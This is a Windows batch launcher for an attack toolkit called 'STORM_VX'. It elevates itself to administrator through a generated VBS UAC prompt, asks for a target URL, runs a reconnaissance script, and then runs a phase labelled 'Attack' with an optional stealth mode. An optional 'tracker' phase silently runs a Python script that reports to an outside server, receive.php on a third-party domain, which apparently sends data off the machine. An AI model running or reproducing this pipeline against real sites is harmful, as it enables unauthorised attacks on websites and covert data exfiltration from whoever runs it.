@echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion
title STORM_VX v2.1

:: ═══════════════════════════════════════════════════════════════
::  AUTO ADMIN ELEVATION — VBS UAC prompt
::  No second CMD window — seamless UAC elevation
:: ═══════════════════════════════════════════════════════════════

:: Save full path to this script BEFORE elevation check
set "SELF_PATH=%~f0"

:: Save ALL original arguments BEFORE elevation check
:: This is critical: UAC elevation loses args if not forwarded!
set "ALL_ARGS=%*"

net session >nul 2>&1
if %errorlevel%==0 goto :is_admin

:: Not admin — create VBS to request UAC elevation
:: FORWARD all original arguments through VBS to the elevated instance
:: Without this, --tracker and other flags are LOST after UAC elevation!
set "vbsFile=%TEMP%\storm_vx_elevate.vbs"
echo Set UAC = CreateObject^("Shell.Application"^) > "!vbsFile!"
echo UAC.ShellExecute "!SELF_PATH!", "!ALL_ARGS!", "", "runas", 1 >> "!vbsFile!"
cscript //nologo "!vbsFile!" >nul 2>&1
del /f "!vbsFile!" >nul 2>&1
exit /b

:is_admin

echo.
echo   STORM_VX v2.1 Modular - by elite ^(taha^)
echo   FINDER =^> TESTER
echo.
echo   [OK] Running as Administrator
echo.

:: --- Check Python ---
set "PYTHON="
where python >nul 2>&1
if %errorlevel%==0 (
    set "PYTHON=python"
) else (
    where python3 >nul 2>&1
    if %errorlevel%==0 (
        set "PYTHON=python3"
    ) else (
        echo.
        echo   [ERROR] Python not found! Install Python 3.
        echo.
        pause
        exit /b 1
    )
)

:: ═══════════════════════════════════════════════════════════════
::  FIND EACH FILE — search ROOT, subdirs, and download/ folder
:: ═══════════════════════════════════════════════════════════════
set "ROOT_DIR=%~dp0"
cd /d "%ROOT_DIR%"

:: --- Find VF_FINDER.py ---
set "FINDER_PATH="
if exist "%ROOT_DIR%VF_FINDER.py" (
    set "FINDER_PATH=%ROOT_DIR%VF_FINDER.py"
) else if exist "%ROOT_DIR%finder\VF_FINDER.py" (
    set "FINDER_PATH=%ROOT_DIR%finder\VF_FINDER.py"
) else if exist "%ROOT_DIR%download\VF_FINDER.py" (
    set "FINDER_PATH=%ROOT_DIR%download\VF_FINDER.py"
)

:: --- Find VF_TESTER.py ---
set "TESTER_PATH="
if exist "%ROOT_DIR%VF_TESTER.py" (
    set "TESTER_PATH=%ROOT_DIR%VF_TESTER.py"
) else if exist "%ROOT_DIR%tester\VF_TESTER.py" (
    set "TESTER_PATH=%ROOT_DIR%tester\VF_TESTER.py"
) else if exist "%ROOT_DIR%download\VF_TESTER.py" (
    set "TESTER_PATH=%ROOT_DIR%download\VF_TESTER.py"
)

:: --- Find VF_TRACKER.py ---
set "TRACKER_PATH="
if exist "%ROOT_DIR%VF_TRACKER.py" (
    set "TRACKER_PATH=%ROOT_DIR%VF_TRACKER.py"
) else if exist "%ROOT_DIR%tracker\VF_TRACKER.py" (
    set "TRACKER_PATH=%ROOT_DIR%tracker\VF_TRACKER.py"
) else if exist "%ROOT_DIR%download\VF_TRACKER.py" (
    set "TRACKER_PATH=%ROOT_DIR%download\VF_TRACKER.py"
)

:: --- Verify ---
if not defined FINDER_PATH (
    echo.
    echo   [ERROR] VF_FINDER.py not found!
    echo   [ERROR] Checked: %ROOT_DIR% , %ROOT_DIR%finder\ , %ROOT_DIR%download\
    echo.
    pause
    exit /b 1
)
if not defined TESTER_PATH (
    echo.
    echo   [ERROR] VF_TESTER.py not found!
    echo   [ERROR] Checked: %ROOT_DIR% , %ROOT_DIR%tester\ , %ROOT_DIR%download\
    echo.
    pause
    exit /b 1
)

:: --- Set PYTHONPATH so Python imports work across directories ---
set "PYTHONPATH=%ROOT_DIR%;%ROOT_DIR%finder;%ROOT_DIR%tester;%ROOT_DIR%tracker;%PYTHONPATH%"

echo   [OK] Python: %PYTHON%
echo   [OK] FINDER: !FINDER_PATH!
echo   [OK] TESTER: !TESTER_PATH!
if defined TRACKER_PATH (
    echo   [OK] TRACKER: !TRACKER_PATH! ^(use --tracker to enable^)
) else (
    echo   [WARNING] VF_TRACKER.py not found
)
echo.

:: ═══════════════════════════════════════════════════════════════
::  PARSE COMMAND LINE ARGUMENTS
:: ═══════════════════════════════════════════════════════════════
set "TARGET_URL="
set "FINDER_FLAGS=--deep"
set "TESTER_FLAGS="
set "RUN_TRACKER=0"

:parse_args
if "%~1"=="" goto :done_parsing
if /i "%~1"=="elite" (
    shift
    goto :parse_args
)
if /i "%~1"=="--tracker" (
    set "RUN_TRACKER=1"
    shift
    goto :parse_args
)
if /i "%~1"=="--deep" (
    shift
    goto :parse_args
)
if /i "%~1"=="--no-deep" (
    set "FINDER_FLAGS="
    shift
    goto :parse_args
)
if /i "%~1"=="--dns" (
    set "FINDER_FLAGS=!FINDER_FLAGS! --dns"
    shift
    goto :parse_args
)
if /i "%~1"=="--stealth" (
    set "TESTER_FLAGS=--stealth"
    shift
    goto :parse_args
)
set "TARGET_URL=%~1"
shift
goto :parse_args

:done_parsing

:: --- Ask for URL if not provided ---
if not "!TARGET_URL!"=="" goto :url_ready

echo.
echo   -----------------------------------------------
echo    Enter target URL ^(e.g. https://target.com^)
echo   -----------------------------------------------
echo.
set /p "TARGET_URL=   URL: "

:: --- Interactive tracker prompt (using GOTO to avoid CMD parenthesized block bugs) ---
if "!TRACKER_PATH!"=="" goto :tracker_skip_prompt
if not "!RUN_TRACKER!"=="0" goto :tracker_skip_prompt
echo.
set /p "ENABLE_TRACKER=   Enable tracker? [y/N]: "
if /i "!ENABLE_TRACKER!"=="y" set "RUN_TRACKER=1"
:tracker_skip_prompt

if "!TARGET_URL!"=="" (
    echo.
    echo   [ERROR] No URL provided. Exiting.
    echo.
    pause
    exit /b 1
)

:: --- Parse --tracker from URL input (user might type: google.com --tracker) ---
set "CLEAN_URL="
for %%W in (!TARGET_URL!) do (
    if /i "%%W"=="--tracker" (
        set "RUN_TRACKER=1"
    ) else if /i "%%W"=="--deep" (
        rem already default
    ) else if /i "%%W"=="--no-deep" (
        set "FINDER_FLAGS="
    ) else if /i "%%W"=="--stealth" (
        set "TESTER_FLAGS=--stealth"
    ) else (
        if "!CLEAN_URL!"=="" (
            set "CLEAN_URL=%%W"
        ) else (
            set "CLEAN_URL=!CLEAN_URL! %%W"
        )
    )
)
if "!RUN_TRACKER!"=="1" (
    set "TARGET_URL=!CLEAN_URL!"
)

:url_ready

:: --- Auto-add https:// if missing ---
set "URL_CHECK=!TARGET_URL:~0,8!"
if "!URL_CHECK!"=="https://" goto :url_set
set "URL_CHECK=!TARGET_URL:~0,7!"
if "!URL_CHECK!"=="http://" goto :url_set
set "TARGET_URL=https://!TARGET_URL!"

:url_set

echo.

:: ═══════════════════════════════════════════════════════════════
::  PHASE 0: TRACKER (OPTIONAL — only with --tracker flag)
::  Using GOTO instead of nested IF/ELSE to avoid CMD parsing bugs
::  with parentheses in echo statements
:: ═══════════════════════════════════════════════════════════════
if not "!RUN_TRACKER!"=="1" goto :skip_tracker
if "!TRACKER_PATH!"=="" goto :tracker_not_found

echo   ===============================================
echo   [PHASE 0] Running VF_TRACKER --tracker enabled
echo   ===============================================
echo.
:: Run tracker with 120-second timeout to prevent freeze.
:: If server is unreachable, tracker won't hang the whole pipeline.
start /b "" %PYTHON% "!TRACKER_PATH!" --silent --server http://namme.taskinoteam.ir/receive.php
:: Wait up to 120 seconds for tracker to finish
set "TRACKER_WAIT=0"
:tracker_wait_loop
if !TRACKER_WAIT! geq 120 goto :tracker_timeout
timeout /t 2 /nobreak >nul 2>&1
set /a "TRACKER_WAIT+=2"
:: Check if python process is still running
tasklist /fi "imagename eq python.exe" 2>nul | find /i "python.exe" >nul 2>&1
if errorlevel 1 goto :tracker_done_running
tasklist /fi "imagename eq python3.exe" 2>nul | find /i "python3.exe" >nul 2>&1
if errorlevel 1 goto :tracker_done_running
goto :tracker_wait_loop
:tracker_timeout
echo.
echo   [WARN] Tracker timed out after 120s. Continuing to next phase...
echo.
goto :tracker_done
:tracker_done_running
echo.
echo   [OK] Tracker complete.
echo.
goto :tracker_done

:tracker_not_found
echo   [WARNING] Tracker requested but VF_TRACKER.py not found. Skipping.
echo.
goto :tracker_done

:skip_tracker
echo   [INFO] Tracker skipped. Use --tracker flag to enable.
echo.

:tracker_done

:: ═══════════════════════════════════════════════════════════════
::  PHASE 1: VF_FINDER — Reconnaissance
:: ═══════════════════════════════════════════════════════════════
echo   ===============================================
echo   [PHASE 1] Running VF_FINDER - Reconnaissance
echo   ===============================================
echo   Target: !TARGET_URL!
echo.

%PYTHON% "!FINDER_PATH!" "!TARGET_URL!" !FINDER_FLAGS! --output VF_PROFILE.json

if not exist "VF_PROFILE.json" (
    echo.
    echo   [ERROR] Profile file not created! FINDER may have failed.
    echo.
    pause
    exit /b 1
)

echo.
echo   [OK] Profile saved to: VF_PROFILE.json
echo.

:: ═══════════════════════════════════════════════════════════════
::  PHASE 2: VF_TESTER — Attack
:: ═══════════════════════════════════════════════════════════════
echo   ===============================================
echo   [PHASE 2] Running VF_TESTER - Attack
echo   ===============================================
echo   Profile: VF_PROFILE.json
echo.

%PYTHON% "!TESTER_PATH!" --profile VF_PROFILE.json !TESTER_FLAGS!

echo.
echo   ===============================================
echo   [DONE] Pipeline completed.
echo   ===============================================
echo.
pause
